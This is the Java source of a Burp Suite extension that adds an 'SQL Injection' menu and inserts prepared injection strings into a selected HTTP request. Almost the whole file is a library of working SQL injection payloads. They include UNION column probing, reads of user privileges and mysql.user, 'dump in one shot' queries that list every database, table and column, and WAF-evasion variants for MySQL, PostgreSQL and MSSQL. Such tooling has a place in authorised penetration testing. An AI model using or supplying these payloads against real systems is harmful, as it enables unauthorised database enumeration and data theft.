/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.math.BigInteger;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JSeparator;

/**
 *
 * @author abdul.wahab
 */
public class SQL_Menu extends JMenu{
    public BurpExtender myburp;
    public String[] SQL_MenuItem = {"Column Count","Union Statements",
                                    "Basic Statements","Databses","Tables",
                                    "Columns","Data","DIOS MySQL",
                                    "DIOS PostgreSQL","DIOS MSSQL","Variable Methods"};
    
    public String SQL_MenuItems[][] = {
        {"Order By","Group By","Procedure Analyse"},
        {"Union Select","Union All Select (int)","Union All Select(null)","(INT),(INT)","(NULL),(NULL)"},
        {"User,DB,Version","Count Databases","File Priv (USER_PRIVILEGES)","File Priv (MySQL System Table)"},
        {"DB Group Concat","DB One Shot"},
        {"Table Group Concat","Table One Shot"},
        {"Column Group Concat","Column One Shot"},
        {"Data Group Concat","Data One Shot"},
        {"DIOS by makman","DIOS by makman v2","DIOS by An0n 3xPloiTeR","DIOS by d3vilbug","DIOS by Shariq","DIOS by Ajkaro",
            "DIOS by Madblood","tr0jan benchmark()","DIOS by Dr.Z3r0","DIOS by Zen","DIOS using replace","DIOS WAF",
            "tr0jan WAF","DIOS by Zen WAF","Madblood WAF","DIOS by AkDK","DIOS by AkDK v2","DIOS by AkDK v3"},
        {"For Postgre 8.4","For Postgre 9.1","For All Versions"},
        {"DIOS By Rummy/Zen"},
        {"DB Names"}    
    };
    
    SQL_Menu(BurpExtender burp){
        this.setText("SQL Injection");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, SQL_MenuItem, SQL_MenuItems, new SQLMenuItemListener(myburp));
    }
}

class SQLMenuItemListener implements ActionListener {

    BurpExtender myburp;
    SQLMenuItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        
        int[] selectedIndex = myburp.context.getSelectionBounds();
        
        String action = e.getActionCommand();
        
        byte[] newRequest = GetNewRequest(request, selectedIndex, action);
        req.setRequest(newRequest);
    }
    
    public String creat_number_list(int count, String str, String str2){
        String col = "+";
        String tmp = ",";
        if(str2 != null ){ tmp = "),("; col = "(";}
        for(int i = 1; i<= count; i++){    
            if(str != null){
                col = col + str + tmp;
            }else{
                col = col + i + tmp;
            }
        }
        col = col.substring(0, col.length()-1);
        if(str2 != null){ col = col.substring(0, col.length()-1);}
        return col;
    }
    

    public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
        String database = null, table = null, columns = null;
        String tmp = null;
        String selectedString = null;
		switch(action){
            case "Order By":
                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                selectedString  = "+Order+By+" + columns + "+";
                break;
            case "Group By":
                columns = Methods.prompt_and_validate_input("Enter No of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, null);
                selectedString = "+GROUP+BY" +  tmp + "+";
                break;
            case "Procedure Analyse":
                selectedString = "+PROCEDURE+ANALYSE()+";
                break;
            case "Union Select":
                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, null);
                selectedString = "+Union+Select" + tmp + "+";
                break;
            case "Union All Select (int)":
                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, null);
                selectedString = "+Union+ALL+Select" + tmp + "+";
                break;
            case "Union All Select(null)":
                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), "NULL", null);
                selectedString = "+Union+ALL+Select" + tmp + "+";
                break;
            case "(INT),(INT)":
                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, "()");
                selectedString = "+Union(Select" + tmp + ")+";
                break;
            case "(NULL),(NULL)":
                columns = Methods.prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), "NULL", "()");
                selectedString = "+Union(Select" + tmp + ")+";
                break;
            case "User,DB,Version":
                selectedString = "+(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()))+";
                break;
            case "Count Databases":
                selectedString = "(SELECT+COUNT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
                break;
            case "File Priv (USER_PRIVILEGES)":
                selectedString = "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
                break;
            case "File Priv (MySQL System Table)":
                selectedString = "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
                break;
            case "DB Group Concat":
                selectedString = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
                break;
            case "DB One Shot":
                selectedString = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
                break;
            case "Table Group Concat":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + database + ")";
                break;
            case "Table One Shot":
                selectedString = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
                break;
            case "Column Group Concat":
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + table + ")";
                break;
            case "Column One Shot":
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" + table + ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)";
                break;
            case "Data Group Concat":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = "(SELECT+GROUP_CONCAT(" + columns + "+SEPARATOR+0x3c62723e)+FROM+" + table + ")";
                break;
            case "Data One Shot":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = Methods.prompt_and_validate_input("Enter Table Name", null);
                columns = Methods.prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(" + table + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + columns + ",0x3c62723e))))x)";
                break;
            case "DIOS by makman":
                selectedString = "+concat(0x3c64697620616c69676e3d226c65667422207374796c653d22666f6e742d66616d696c793a20436f6d69632053616e73204d53223e3c68313e44494f53204279206d616b6d616e3c2f68313e,user(),0x3c62723e,version(),@x:='',@y:='',@schname:='',@tbl:='',0x0a,if(benchmark((select+count(*)from+information_schema.schemata+where+schema_name!='information_schema'),@x:=concat(@x,0x0a0a,@y:='',(select+concat(0x3c68723e,repeat(0x2d,length(schema_name)),0x3c62723e,@schname:=schema_name,0x3c62723e,repeat(0x2d,length(schema_name)),if((select+count(*)from+information_schema.columns+where+table_schema=schema_name+and+@y:=concat(@y,0x0a,if(@tbl!=table_name,concat(0x3c62723e2d2d3e20,@tbl:=table_name,0x3a3a,(select+table_rows+from+information_schema.tables+where+table_schema=schema_name+and+table_name=@tbl+limit+1)),concat(0x2a,column_name)))),'',''),@y)from+information_schema.schemata+where+schema_name!='information_schema'+and+schema_name+>+@schname+order+by+schema_name+ASC+limit+1))),'',''),0x0a,@x)+as+makman+";
                break;
            case "DIOS by makman v2":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + database + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
                break;
            case "DIOS by An0n 3xPloiTeR":
                selectedString = "+concat(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a65637465642062792022416e306e203378506c6f69546552223c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x3c666f6e7420636f6c6f723d22726564223e20202d2d2d3e203c2f666f6e743e,column_name,0x3c62723e))))a))+";
                break;
            case "DIOS by d3vilbug":
                selectedString = "+concat_ws(0x3c62723e2028405f402920,(select+0xaa3c64697620616c69676e3d226c65667422207374796c653d22666f6e742d66616d696c793a20436f6d69632053616e73204d533b223e3c68313e496e6a656374656420627920643376696c5f6275673c2f68313e),(select+concat(0x55736572,0x203c3c3c3d3d3d3d3e3e3e20,USER())),(select+concat(0x4461746162617365,0x203c3c3c3d3d3d3d3e3e3e20,DATABASE())),(select+concat(0x56657273696f6e,0x203c3c3c3d3d3d3d3e3e3e20,VERSION())),(select+concat(0x4f53,0x203c3c3c3d3d3d3d3e3e3e20,@@version_compile_os)),(select+concat(0x486f73746e616d65,0x203c3c3c3d3d3d3d3e3e3e20,@@hostname)),(select+0x3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a),(select concat((select+concat(0x3c62207374796c653d27666f6e742d73697a653a33327078273e4461746162617365733c2f623e3c62723e28405f402920,(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e28405f402920))))x))),0x3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a)),(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where+table_schema!=0x696e666f726d6174696f6e5f736368656d61+and(@a)in (@a:=concat(@a,table_schema,0x20203e20,table_name,0x203e20,column_name,0x3c62723e28405f402920))))a))+";
                break;
            case "DIOS by Madblood":
                selectedString = "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
                break;
            case "DIOS by Dr.Z3r0":
                selectedString = "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
                break;
            case "DIOS by Zen":
                selectedString = "+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)+";
                break;
            case "DIOS by Shariq":
                selectedString = "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)";
                break;
            case "DIOS using replace":
                selectedString = "+replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e3c666f6e7420636f6c6f723d7265643e263c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d707572706c653e273c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x24,0x3c62723e3c62723e3c666f6e7420636f6c6f723d626c61636b3e72306f744048335834393c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+%0Ainformation_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@)+";
                break;
            case "DIOS by Zen WAF":
                selectedString = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
                break;
            case "DIOS by Ajkaro":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=" + database + ")and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
                break;
            case "DIOS by AkDK":
                database = Methods.prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = "concat/***/(0x223e3c2f7461626c653e3c2f6469763e3c2f613e3c666f6e7420636f6c6f723d677265656e3e3c62723e3c62723e3c62723e,0x3c666f6e7420666163653d63616d62726961207374796c653d726567756c61722073697a653d3320636f6c6f723d7265643e7e7e7e7e7e3a3a3a3a3a496e6a6563746564206279416c69204b68616e3a3a3a3a3a7e7e7e7e7e3c62723e3c666f6e7420636f6c6f723d626c75653e2056657273696f6e203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,version(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e204461746162617365203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,database(),0x3c62723e3c666f6e7420636f6c6f723d626c75653e2055736572203a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e,user(),0x3c62723e3c666f6e7420636f6c6f723d7265643e205461626c657320203c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a3a203c666f6e7420636f6c6f723d677265656e3e436f6c756d6e733c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e,@:=0,%28Select+count(*)from%28information_Schema.columns)where(table_schema=" + database + ")and@:=concat/**/(@,0x3c6c693e,0x3c666f6e7420636f6c6f723d7265643e,table_name,0x3c2f666f6e743e203a3a3a3a3a3a3a3a3a3a3a2020203c666f6e7420636f6c6f723d677265656e3e,column_name,0x3c2f666f6e743e)),@,0x3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e3c62723e)";
                break;
            case "DIOS by AkDK v2":
                selectedString = "+/*!00000concat*/(0x63726561746f723a2064705f6d6d78,0x3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d353e44622056657273696f6e203a20,version(),0x3c62723e44622055736572203a20,user(),0x3c62723e3c62723e3c2f666f6e743e3c7461626c6520626f726465723d2231223e3c74686561643e3c74723e3c74683e44617461626173653c2f74683e3c74683e5461626c653c2f74683e3c74683e436f6c756d6e3c2f74683e3c2f74686561643e3c2f74723e3c74626f64793e,(select%20(@x)%20/*!00000from*/%20(select%20(@x:=0x00),(select%20(0)%20/*!00000from*/%20(information_schema/**/.columns)%20where%20(table_schema!=0x696e666f726d6174696f6e5f736368656d61)%20and%20(0x00)%20in%20(@x:=/*!00000concat*/(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x))+";
                break;
            case "DIOS by AkDK v3":
                selectedString = "+concat(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,concat(concat(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e3a3a203c2f666f6e743e3c2f63656e7465723e3c2f623e),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),concat(0x3c62723e3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c62723e546f74616c205461626c657320496e20416c6c20446174616261736573203a3a20,(select count(*) from information_Schema.tables),0x3c62723e5461626c657320436f756e7420496e205072696d617279204461746162617365203a3a20,(Select count(*) from information_Schema.tables where table_schema=database()),(select(@x)from(select(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(select(0) from(information_schema.columns)where(table_schema=database()) and(0x00)in(@x:=Concat(@x, 0x3c62723e, if( (@tbl!=table_name), Concat(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,LPAD(@r:=@r%2B1, 2, 0x30),0x2e,@tbl:=table_name,0x3c666f6e7420636f6c6f723d626c61636b3e203a3a20436f6c756d6e7320496e2054686973205461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@tbl),0x20284461746162617365203a3a20,database(),0x29,0x3c2f666f6e743e,0x3c62723e), 0x00),0x203a3a20,0x3c666f6e7420636f6c6f723d677265656e2073697a653d323e,0x7e20,column_name,0x3c2f666f6e743e ))))x))))+";
                break;
            case "DIOS WAF":
                selectedString = "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))";
                break;
            case "tr0jan benchmark()":
                selectedString = "+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+";
                break;
            case "tr0jan WAF":
                selectedString = "+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+";
                break;
            case "Madblood WAF":
                selectedString = "+export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)+";
                break;
            case "For Postgre 8.4":
                selectedString = "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
                break;
            case "For Postgre 9.1":
                selectedString = "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
                break;
            case "For All Versions":
                selectedString = "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";
                break;
            case "DIOS By Rummy/Zen":
                selectedString = ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--";
                break;
            case "DB Names":
                selectedString = "(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)";
                break;
            default:
            	break;
                
        }
        if (selectedString!=null){//caution the difference of equals and ==
        	return Methods.do_modify_request(request, selectedIndex, selectedString.getBytes());
        }else {
        	return request;
        }
    }
}
